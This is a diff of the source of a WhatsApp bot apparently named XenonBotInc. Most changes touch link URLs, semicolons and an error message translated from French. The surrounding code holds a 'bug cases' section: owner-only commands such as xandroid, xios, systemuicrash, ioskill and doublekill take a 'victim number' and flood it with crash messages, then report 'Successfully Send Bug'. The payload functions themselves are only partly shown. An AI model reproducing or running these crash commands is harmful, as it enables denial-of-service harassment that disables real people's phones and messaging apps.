-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -27027,11 +26539,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -27071,9 +26583,10 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-    //BUG CASES
+
+ //bug cases
 case "xandroid": {
   if (!XenonTheCreator) return
   if (!text) return replygcxenon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 225xxxxxxxxxx,5`) 
@@ -27105,9 +26618,9 @@ case "xandroid": {
     [whatsappNumber]
   );
 }
-break
-//===========================================================================================================================//
-;
+break;
+//===========================================================================================================================//;
+
 case "xios": {
   if (!XenonTheCreator) return
   if (!text) return replygcxenon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 225xxxxxxxxxx,5`) 
@@ -27139,9 +26652,9 @@ case "xios": {
     [whatsappNumber]
   );
 }
-break
-//===========================================================================================================================//
-;
+break;
+//===========================================================================================================================//;
+
 case "xios2":
   {
 	if (!XenonTheCreator) return
@@ -27161,9 +26674,9 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break
-//===========================================================================================================================//
-;
+  break;
+//===========================================================================================================================//;
+
   case "xandroid2":
   {
 	if (!XenonTheCreator) return
@@ -27183,9 +26696,9 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break
-//===========================================================================================================================//
-;
+  break;
+//===========================================================================================================================//;
+
   case "xgc":
   {
     if (!XenonTheCreator) return
@@ -27209,9 +26722,9 @@ case "xios2":
       replygcxenon(util.format(error));
     }
   }
-  break
-//===========================================================================================================================//
-;
+  break;
+//===========================================================================================================================//;
+
   case "🙂":
   {
 	if (!XenonTheCreator) return
@@ -27231,9 +26744,8 @@ case "xios2":
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
-  break
-//===========================================================================================================================//
-;
+  break;
+//===========================================================================================================================//;
   case "systemuicrash": {
   if (!XenonTheCreator) return
   if (!text) return replygcxenon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 225xxxxxxxxxx,5`) 
@@ -27265,9 +26777,9 @@ case "xios2":
     [whatsappNumber]
   );
 }
-break
-//===========================================================================================================================//
-;
+break;
+//===========================================================================================================================//;
+
 case "xsysui": {
   if (!XenonTheCreator) return
   if (!text) return replygcxenon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 225xxxxxxxxxx,5`) 
@@ -27299,9 +26811,10 @@ case "xsysui": {
     [whatsappNumber]
   );
 }
-break
-//===========================================================================================================================//
-;
+break;
+//===========================================================================================================================//;
+
+
 case 'ioskill': case 'iosx': {
             	if (!XenonTheCreator) return
 let xenonyvictim = q.replace(/[^0-9]/g, "")
@@ -27313,7 +26826,7 @@ let target = xenonyvictim + '@s.whatsapp.net'
     await sleep(1200)
   }
 }
-break
+break;
 //===========================================================================================================================//
 
 case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
@@ -27333,8 +26846,9 @@ await locationxenony(target, force)
 }
 await replygcxenon(`Successfully Send Bug to ${xenonyvictim} Using ${command}. ✅`)
 }
-break
+break;
 //===========================================================================================================================//
+
 
 			default:
 			if (budy.startsWith('>')) {
@@ -27376,7 +26890,7 @@ XenonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
 	} catch (err) {
 		console.log(util.format(err))
         let e = String(err)
-XenonBotInc.sendMessage("2250500107362@s.whatsapp.net", { text: "🌹 Bonjour développeur, il semble y avoir une erreur, veuillez la corriger " + util.format(e), 
+XenonBotInc.sendMessage("2250500107362@s.whatsapp.net", { text: "🌹 Hello developer, there seems to be an error, please fix it " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
